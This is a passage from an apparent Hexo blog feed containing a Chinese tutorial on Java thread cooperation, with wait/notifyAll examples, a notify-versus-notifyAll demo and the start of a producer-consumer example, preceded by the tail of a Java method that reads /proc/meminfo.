 * [/dev/sda1, 8.3G, 6.4G, 1.5G, 82%, /]</span><br><span class="line">         */</span><br><span class="line">        while ((line = input.readLine()) != null) &#123;  </span><br><span class="line">        	//System.out.println(&quot;----------&quot;+line);</span><br><span class="line">        	String[] temp = line.split(&quot; &quot;);</span><br><span class="line">            List&lt;String&gt; list_dev_sda = new ArrayList();</span><br><span class="line">        	for (String string : temp) &#123;</span><br><span class="line">        		string = string.replaceAll(&quot; &quot;, &quot;&quot;);</span><br><span class="line">        		if(!string.equals(&quot;&quot;))&#123;</span><br><span class="line">        			//System.out.println(string);</span><br><span class="line">                	list_dev_sda.add(string);</span><br><span class="line">        		&#125;</span><br><span class="line">			&#125;</span><br><span class="line">        	System.out.println(list_dev_sda.toString());</span><br><span class="line">        	result.add(list_dev_sda);</span><br><span class="line">        &#125;</span><br><span class="line">        return result;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	public static HashMap&lt;String, Float&gt; getMemInfo() throws IOException&#123;</span><br><span class="line">		</span><br><span class="line">		String commands = &quot;cat /proc/meminfo&quot;;</span><br><span class="line">		Process process = Runtime.getRuntime().exec(commands);  </span><br><span class="line">        InputStreamReader ir = new InputStreamReader(process.getInputStream(), &quot;UTF-8&quot;);  </span><br><span class="line">        BufferedReader input = new BufferedReader(ir);  </span><br><span class="line">        //读第一行和第二行</span><br><span class="line">        String[] memTotalArray = input.readLine().replace(&quot; &quot;, &quot;&quot;).split(&quot;:&quot;);</span><br><span class="line">        String[] memFreeArray = input.readLine().replace(&quot; &quot;, &quot;&quot;).split(&quot;:&quot;);</span><br><span class="line">        </span><br><span class="line">        float memTotal = Float.valueOf(memTotalArray[1].replace(&quot;kB&quot;, &quot;&quot;));</span><br><span class="line">        float memFree = Float.valueOf(memFreeArray[1].replace(&quot;kB&quot;, &quot;&quot;));</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;memTotal = &quot;+memTotal/(1024*1024) + &quot;GB&quot;);</span><br><span class="line">        System.out.println(&quot;memFree = &quot;+memFree/1024 + &quot;MB&quot;);</span><br><span class="line">        HashMap&lt;String, Float&gt; mem = new HashMap&lt;&gt;();</span><br><span class="line">        mem.put(&quot;memTotal&quot;, memTotal);</span><br><span class="line">        mem.put(&quot;memFree&quot;, memFree);</span><br><span class="line">        return mem;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>Java编程思想之并发-线程之间的协作</title>
    <url>/Java/Java%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3%E4%B9%8B%E5%B9%B6%E5%8F%91-%E7%BA%BF%E7%A8%8B%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8D%8F%E4%BD%9C/</url>
    <content><![CDATA[<p>注意：<a href="http://chaodongyang.com/2017/12/28/javaConcurrencyFour/" target="_blank" rel="noopener">本文来自chaodongyang.com，点击阅读原文</a></p>
<h2 id="java编程思想之并发-线程之间的协作"><a href="#java编程思想之并发-线程之间的协作" class="headerlink" title="java编程思想之并发(线程之间的协作)"></a>java编程思想之并发(线程之间的协作)</h2><p>当你使用多线程来同时运行多个任务时，可以通过使用锁来同步两个任务的行为，从而使的一个任务不会干涉另一个任务的资源。也就是说，如果两个任务交替的步入某项共享资源，你可以使用互斥来保证任何时刻只有一个任务可以访问这项资源。</p>
<h2 id="线程之间的协作"><a href="#线程之间的协作" class="headerlink" title="线程之间的协作"></a>线程之间的协作</h2><p>上面的问题已经解决了，下一步是如何使得任务彼此之间可以协作，使得多个任务可以一起工作去解决某个问题。现在的问题不是彼此之间的干涉，而是彼此之间的协作。解决这类问题的关键是某些部分必须在其他部分被解决之前解决。<br>当任务协作时，关键问题是这些任务之间的握手。为了实现握手，我们使用了相同的基础特性：互斥。在这种情况下，互斥能够确保只有一个任务可以响应某个信号，这样就能根除任何可能的竞争条件。在互斥上，我们为任务添加了一种途径，可以将自身挂起，直至某些外部条件发生变化，表示是时候让这个任务开始为止。</p>
<h3 id="wait-与-notifyAll"><a href="#wait-与-notifyAll" class="headerlink" title="wait() 与 notifyAll()"></a>wait() 与 notifyAll()</h3><p>wait() 可以使你等待某个条件发生变化，而改变这个条件通常是由另一个任务来改变。你肯定不想在你的任务测试这个条件的同时，不断的进行空循环，这被称为忙等待，是一种不良的 cpu 使用方式。因此 wait() 会在外部条件发生变化的时候将任务挂起，并且只有在 notif() 或 notifAll() 发生时，这个任务才会被唤醒并去检查所发生的变化。因此，wait() 提供了一种在任务之间对活动同步的方式。<br>调用 sleep() 时候锁并没有被释放，调用 yield() 也是一样。当一个任务在方法里遇到对 wait() 调用时，线程执行被挂起，对象的锁被释放。这就意味着另一个任务可以获得锁，因此在改对象中的其他 synchronized 方法可以在 wait() 期间被调用。因此，当你在调用 wait() 时，就是在声明：“我已经做完了所有的事情，但是我希望其他的 synchronized 操作在条件何时的情况下能够被执行”。<br>有两种形式的 wait():</p>
<ul>
<li>第一种接受毫秒作为参数:指再次暂停的时间。<ul>
<li>在 wait() 期间对象锁是被释放的。</li>
<li>可以通过 notif() 或 notifAll()，或者指令到期，从 wait() 中恢复执行。</li>
</ul>
</li>
<li>第二种不接受参数的 wait(). <ul>
<li>这种 wait() 将无线等待下去，直到线程接收到 notif() 或 notifAll()。</li>
</ul>
</li>
</ul>
<p>wait()、notif()以及 notifAll() 有一个比较特殊的方面，那就是这些方法是基类 Object 的一部分，而不是属于 Thread 类。仅仅作为线程的功能却成为了通用基类的一部分。原因是这些方法操作的锁，也是所有对象的一部分。所以你可以将 wait() 放进任何同步控制方法里，而不用考虑这个类是继承自 Thread 还是 Runnable。实际上，只能在同步方法或者同步代码块里调用 wait()、notif() 或者 notifAll()。如果在非同步代码块里操作这些方法，程序可以通过编译，但是在运行时会得到 IllegalMonitorStateException 异常。意思是，在调用 wait()、notif() 或者 notifAll() 之前必须拥有获取对象的锁。<br>比如，如果向对象 x 发送 notifAll()，那就必须在能够得到 x 的锁的同步控制块中这么做：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span>(x)&#123;</span><br><span class="line">  x.notifAll();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们看一个示例：一个是将蜡涂到 Car 上，一个是抛光它。抛光任务在涂蜡任务完成之前，是不能执行其工作的，而涂蜡任务在涂另一层蜡之前必须等待抛光任务完成。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line">  <span class="comment">//涂蜡和抛光的状态</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">boolean</span> waxOn = <span class="keyword">false</span>;</span><br><span class="line">	<span class="comment">//打蜡</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">waxed</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		waxOn = <span class="keyword">true</span>;</span><br><span class="line">		notifyAll();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//抛光</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">buffed</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		waxOn = <span class="keyword">false</span>;</span><br><span class="line">		notifyAll();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//抛光结束被挂起即将开始打蜡任务</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">waitForWaxing</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException</span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (waxOn == <span class="keyword">false</span>) &#123;</span><br><span class="line">			wait();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//打蜡结束被挂起即将开始抛任务</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">waitForBuffing</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException</span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (waxOn == <span class="keyword">true</span>) &#123;</span><br><span class="line">			wait();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>开始打蜡的任务：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WaxOn</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Car car;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="title">WaxOn</span><span class="params">(Car car)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">		<span class="keyword">this</span>.car = car;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">while</span> (!Thread.interrupted()) &#123;</span><br><span class="line">				System.out.println(<span class="string">"Wax one"</span>);</span><br><span class="line">				TimeUnit.MICROSECONDS.sleep(<span class="number">200</span>);</span><br><span class="line">				<span class="comment">//开始打蜡</span></span><br><span class="line">				car.waxed();</span><br><span class="line">				<span class="comment">//当前任务被挂起</span></span><br><span class="line">				car.waitForBuffing();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			System.out.println(<span class="string">" Exiting via interrupt"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">"Ending wax on task"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>开始抛光的任务：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WaxOff</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Car car;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="title">WaxOff</span><span class="params">(Car car)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">		<span class="keyword">this</span>.car = car;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">while</span> (!Thread.interrupted()) &#123;</span><br><span class="line">				<span class="comment">//如果还是在打蜡就挂起</span></span><br><span class="line">				car.waitForWaxing();</span><br><span class="line">				System.out.println(<span class="string">"Wax off"</span>);</span><br><span class="line">				TimeUnit.MICROSECONDS.sleep(<span class="number">200</span>);</span><br><span class="line">				<span class="comment">//开始抛光</span></span><br><span class="line">				car.buffed();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			System.out.println(<span class="string">"Wxtiing via interrupt"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">"Ending wax off task"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>测试类：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WaxOmatic</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		Car car = <span class="keyword">new</span> Car();</span><br><span class="line">		ExecutorService service = Executors.newCachedThreadPool();</span><br><span class="line">		service.execute(<span class="keyword">new</span> WaxOff(car));</span><br><span class="line">		service.execute(<span class="keyword">new</span> WaxOn(car));</span><br><span class="line">		<span class="comment">//暂停2秒钟</span></span><br><span class="line">		TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">		<span class="comment">//关闭所有的任务</span></span><br><span class="line">		service.shutdownNow();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>执行结果：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Wax one</span><br><span class="line">Wax off</span><br><span class="line">Wax one</span><br><span class="line">Wax off</span><br><span class="line">Wax one</span><br><span class="line">Wax off</span><br><span class="line">Exiting via interrupt</span><br><span class="line">Wxtiing via interrupt</span><br><span class="line">Ending wax on task</span><br><span class="line">Ending wax off task</span><br></pre></td></tr></table></figure></p>
<p>在 waitForWaxing() 中检查 WaxOn 标志，如果它是 false，那么这个调用任务将会被挂起。这个行为发生在 synchronized 方法中这一点很重要。因为在这个方法中任务已经获得了锁。当你调用 wait() 时，线程被挂起，而锁被释放。释放锁是本质所在，因为为了安全的改变对象的状态，其他某个任务就必须能够获得这个锁。<br>WaxOn.run() 表示给汽车打蜡的第一个步骤，它执行他的操作：调用 sleep() 模拟打蜡的时间，然后告知汽车打蜡结束，并且调用 waitForWaxing(),这个方法会调用 wait() 挂起当前打蜡的任务。直到 WaxOff 任务调用这两车的 buffed(),从而改变状态并且调用 notfiAll() 重新唤醒为止。翻过来也是一样的，在运行程序时，你可以看到控制权在两个任务之间来回的传递，这两个步骤过程在不断的重复。</p>
<p><strong> 错失的信号 </strong><br>当两个线程使用 notif()/wait() 或者 notifAll()/wait() 进行协作时，有可能会错过某个信号。假设线程 T1 是通知 T2 的线程，而这两个线程都使用下面的方式实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">T1:</span><br><span class="line"><span class="keyword">synchronized</span>(X)&#123;</span><br><span class="line">  <span class="comment">//设置 T2 的一个条件</span></span><br><span class="line">  &lt;setup condition <span class="keyword">for</span> T2&gt;</span><br><span class="line">  x.notif();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">T2:</span><br><span class="line"><span class="keyword">while</span>(someCondition)&#123;</span><br><span class="line">  <span class="comment">//Potit</span></span><br><span class="line">  <span class="keyword">synchronized</span>(x)&#123;</span><br><span class="line">    x.wait();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上的例子假设 T2 对 someCondition 发现其为 true()。在执行 Potit 其中线程调度器可能切换到了 T1。而 T1 将会执行重新设置 condition，并且调用唤醒。当 T2 继续执行时，以至于不能意识到条件已经发生变化，因此会盲目的进入 wait()。此时唤醒在之前已经调用过了，而 T2 将无限的等待下去唤醒的信号。<br>解决该问题的方案是防止 someCondition 变量上产生竞争条件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span>(x)&#123;</span><br><span class="line">  <span class="keyword">while</span>(someCondition)&#123;</span><br><span class="line">    x.wait();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="notif-与-notifAll"><a href="#notif-与-notifAll" class="headerlink" title="notif() 与 notifAll()"></a>notif() 与 notifAll()</h3><p>可能有多个任务在单个 Car 对象上被挂起处于 wait() 状态，因此调用 notifyAll() 比调用 notify() 更安全。使用 notify() 而不是 notifyAll() 是一种优化。使用 notify() 时，在众多等待同一个锁的任务中只有一个被唤醒，因此如果你希望使用 notify()，就必须保证被唤醒的是恰当的任务。另外使用 notify() ，所有任务都必须等待相同的条件，因为如果你有多个任务在等待不同的条件，那你就不会知道是否唤醒了恰当的任务。如果使用 notfiy(),当条件发生变化时，必须只有一个任务能从中收益。最后，这些限制对所有可能存在的子类都必须总起作用。如果这些规则任何一条不满足都必须使用 notifyAll()。<br>在 Java 的线程机制中，有一个描述是这样的：notifyAll() 将唤醒所有正在等待的任务。这是否意味着在程序中任何地方，任何处于 wait() 状态中的任务都将被任何对 notifyAll() 的调用唤醒呢？在下面的实例中说明了情况并非如此，当 notifyAll() 因某个特定锁被调用时，只有等待这个锁的任务才会被唤醒：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Blocker</span> </span>&#123;</span><br><span class="line">	 <span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">waitingCall</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">try</span> &#123;</span><br><span class="line">	      <span class="keyword">while</span>(!Thread.interrupted()) &#123;</span><br><span class="line">	        wait();</span><br><span class="line">	        System.out.print(Thread.currentThread() + <span class="string">" "</span>);</span><br><span class="line">	      &#125;</span><br><span class="line">	    &#125; <span class="keyword">catch</span>(InterruptedException e) &#123;</span><br><span class="line">	      <span class="comment">// OK to exit this way</span></span><br><span class="line">	    &#125;</span><br><span class="line">	  &#125;</span><br><span class="line">	  <span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">prod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		  notify();</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">prodAll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		  notifyAll();</span><br><span class="line">	  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建任务 Task:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Task</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">	  <span class="keyword">static</span> Blocker blocker = <span class="keyword">new</span> Blocker();</span><br><span class="line">	  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123; blocker.waitingCall(); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建任务 Task2:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Task2</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">	  <span class="comment">// A separate Blocker object:</span></span><br><span class="line">	  <span class="keyword">static</span> Blocker blocker = <span class="keyword">new</span> Blocker();</span><br><span class="line">	  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123; blocker.waitingCall(); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试类：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NotifyVsNotifyAll</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">		ExecutorService service = Executors.newCachedThreadPool();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">			service.execute(<span class="keyword">new</span> Task());</span><br><span class="line">		&#125;</span><br><span class="line">			service.execute(<span class="keyword">new</span> Task2());</span><br><span class="line">			Timer timer = <span class="keyword">new</span> Timer();</span><br><span class="line">			timer.scheduleAtFixedRate(<span class="keyword">new</span> TimerTask() &#123;</span><br><span class="line">				<span class="keyword">boolean</span> prod = <span class="keyword">true</span>;</span><br><span class="line">				<span class="meta">@Override</span></span><br><span class="line">				<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">					<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">					<span class="keyword">if</span> (prod) &#123;</span><br><span class="line">						System.out.println(<span class="string">"notify"</span>);</span><br><span class="line">						Task.blocker.prod();</span><br><span class="line">						prod = <span class="keyword">false</span>;</span><br><span class="line">					&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">						System.out.println(<span class="string">"notifyAll"</span>);</span><br><span class="line">						Task.blocker.prodAll();</span><br><span class="line">						prod = <span class="keyword">true</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;, <span class="number">400</span>, <span class="number">400</span>);</span><br><span class="line">			TimeUnit.SECONDS.sleep(<span class="number">5</span>);</span><br><span class="line">			timer.cancel();</span><br><span class="line">			System.out.println(<span class="string">"Time cancle"</span>);</span><br><span class="line">			TimeUnit.MILLISECONDS.sleep(<span class="number">500</span>);</span><br><span class="line">		    System.out.println(<span class="string">"Task2.blocker.prodAll() "</span>);</span><br><span class="line">		    Task2.blocker.prodAll();</span><br><span class="line">		    TimeUnit.MILLISECONDS.sleep(<span class="number">500</span>);</span><br><span class="line">		    System.out.println(<span class="string">"\nShutting down"</span>);</span><br><span class="line">		    service.shutdownNow(); <span class="comment">// Interrupt all tasks</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>测试结果：<br><figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">notify</span><br><span class="line">Thread[pool-<span class="number">1</span>-thread-<span class="number">2</span>,<span class="number">5</span>,main] notifyAll</span><br><span class="line">Thread[pool-<span class="number">1</span>-thread-<span class="number">2</span>,<span class="number">5</span>,main] Thread[pool-<span class="number">1</span>-thread-<span class="number">3</span>,<span class="number">5</span>,main] Thread[pool-<span class="number">1</span>-thread-<span class="number">1</span>,<span class="number">5</span>,main] notify</span><br><span class="line">Thread[pool-<span class="number">1</span>-thread-<span class="number">2</span>,<span class="number">5</span>,main] notifyAll</span><br><span class="line">Thread[pool-<span class="number">1</span>-thread-<span class="number">2</span>,<span class="number">5</span>,main] Thread[pool-<span class="number">1</span>-thread-<span class="number">1</span>,<span class="number">5</span>,main] Thread[pool-<span class="number">1</span>-thread-<span class="number">3</span>,<span class="number">5</span>,main] notify</span><br><span class="line">Thread[pool-<span class="number">1</span>-thread-<span class="number">2</span>,<span class="number">5</span>,main] notifyAll</span><br><span class="line">Thread[pool-<span class="number">1</span>-thread-<span class="number">2</span>,<span class="number">5</span>,main] Thread[pool-<span class="number">1</span>-thread-<span class="number">3</span>,<span class="number">5</span>,main] Thread[pool-<span class="number">1</span>-thread-<span class="number">1</span>,<span class="number">5</span>,main] notify</span><br><span class="line">Thread[pool-<span class="number">1</span>-thread-<span class="number">2</span>,<span class="number">5</span>,main] notifyAll</span><br><span class="line">Thread[pool-<span class="number">1</span>-thread-<span class="number">2</span>,<span class="number">5</span>,main] Thread[pool-<span class="number">1</span>-thread-<span class="number">1</span>,<span class="number">5</span>,main] Thread[pool-<span class="number">1</span>-thread-<span class="number">3</span>,<span class="number">5</span>,main] notify</span><br><span class="line">Thread[pool-<span class="number">1</span>-thread-<span class="number">2</span>,<span class="number">5</span>,main] notifyAll</span><br><span class="line">Thread[pool-<span class="number">1</span>-thread-<span class="number">2</span>,<span class="number">5</span>,main] Thread[pool-<span class="number">1</span>-thread-<span class="number">3</span>,<span class="number">5</span>,main] Thread[pool-<span class="number">1</span>-thread-<span class="number">1</span>,<span class="number">5</span>,main] notify</span><br><span class="line">Thread[pool-<span class="number">1</span>-thread-<span class="number">2</span>,<span class="number">5</span>,main] notifyAll</span><br><span class="line">Thread[pool-<span class="number">1</span>-thread-<span class="number">2</span>,<span class="number">5</span>,main] Thread[pool-<span class="number">1</span>-thread-<span class="number">1</span>,<span class="number">5</span>,main] Thread[pool-<span class="number">1</span>-thread-<span class="number">3</span>,<span class="number">5</span>,main] Time cancle</span><br><span class="line">Task2<span class="variable">.blocker</span><span class="variable">.prodAll</span>()</span><br><span class="line">Thread[pool-<span class="number">1</span>-thread-<span class="number">4</span>,<span class="number">5</span>,main]</span><br><span class="line">Shutting down</span><br></pre></td></tr></table></figure></p>
<p>从上面输出的结果可以看出，我们启动了三个 Task 任务线程，一个 Task2 线程。使用 timer 做了一个定时器，每间隔 4 毫秒就轮换启动 Task.blocker 的 notify() 和 notifyAll()方法。我们看到 Task 和 Task2 都有 Blocker 对象，他们调用 Blocker 对象的时候都会被阻塞。我们看到当调用 Task.prod() 的时候只有一个在等待锁的任务被唤醒，其余两个继续挂起。当调用 Task.prodAll() 的时候等待的三个线程都会被唤醒。当调用 Task2。prodAll() 的时候 只有 Task2 的线程任务被唤醒。其余的三个 Task 任务继续挂起。</p>
<h3 id="生产者与消费者"><a href="#生产者与消费者" class="headerlink" title="生产者与消费者"></a>生产者与消费者</h3><p>请考虑这样一种情况，在饭店有一个厨师和一个服务员。这个服务员必须等待厨师做好膳食。当厨师准备好时会通知服务员，之后服务员上菜，然后返回继续等待。这是一个任务协作示例：厨师代表生产者，而服务员代表消费者。两个任务必须在膳食被生产和消费时进行握手，而系统必须是以有序的方式关闭。<br>膳食类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Meal</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> orderNum;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Meal</span><span class="params">(<span class="keyword">int</span> orderNum)</span> </span>&#123; <span class="keyword">this</span>.orderNum = orderNum; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">"Meal "</span> + orderNum; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>服务生类：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WaitPerson</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">	  <span class="keyword">private</span> Restaurant restaurant;</span><br><span class="line">	  <span class="function"><span class="keyword">public</span> <span class="title">WaitPerson</span><span class="params">(Restaurant r)</span> </span>&#123;</span><br><span class="line">		  restaurant = r;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">try</span> &#123;</span><br><span class="line">	      <span class="keyword">while</span>(!Thread.interrupted()) &#123;</span><br><span class="line">	        <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">	          <span class="keyword">while</span>(restaurant.meal == <span class="keyword">null</span>)</span><br><span class="line">	            wait(); <span class="comment">// ... for the chef to produce a meal</span></span><br><span class="line">	        &#125;</span><br><span class="line">	        Print.print(<span class="string">"Waitperson got "</span> + restaurant.meal);</span><br><span class="line">	        <span class="keyword">synchronized</span>(restaurant.chef) &#123;</span><br><span class="line">	          restaurant.meal = <span class="keyword">null</span>;</span><br><span class="line">	          restaurant.chef.notifyAll(); <span class="comment">// Ready for another</span></span><br><span class="line">	        &#125;</span><br><span class="line">	      &#125;</span><br><span class="line">	    &#125; <span class="keyword">catch</span>(InterruptedException e) &#123;</span><br><span class="line">	    	Print.print(<span class="string">"WaitPerson interrupted"</span>);</span><br><span class="line">	    &#125;</span><br><span class="line">	  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>厨师类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Chef</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">	  <span class="keyword">private</span> Restaurant restaurant;</span><br><span class="line">	  <span class="keyword">private</span> <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">	  <span class="function"><span class="keyword">public</span> <span class="title">Chef</span><span class="params">(Restaurant r)</span> </span>&#123;</span><br><span class="line">		  restaurant = r;</span><br><span class="line">	  &#125;</span><br><span class="line">	  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">try</span> &#123;</span><br><span class="line">	      <span class="keyword">while</span>(!Thread.interrupted()) &#123;</span><br><span class="line">	        <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">	          <span class="keyword">while</span>(restaurant.meal != <span class="keyword">null</span>)</span><br><span class="line">	            wait(); <span class="comment">// ... for the meal to be taken</span></span><br><span class="line">	        &#125;</span><br><span class="line">	        <span class="keyword">if</span>(++count == <span class="number">10</span>) &#123;</span><br><span class="line">	        	Print.print(<span class="string">"Out of food, closing"</span>);</span><br><span class="line">	          restaurant.exec.shutdownNow();</span><br><span class="line">	        &#125;</span><br><span class="line">	        Print.printnb(<span class="string">"Order up! 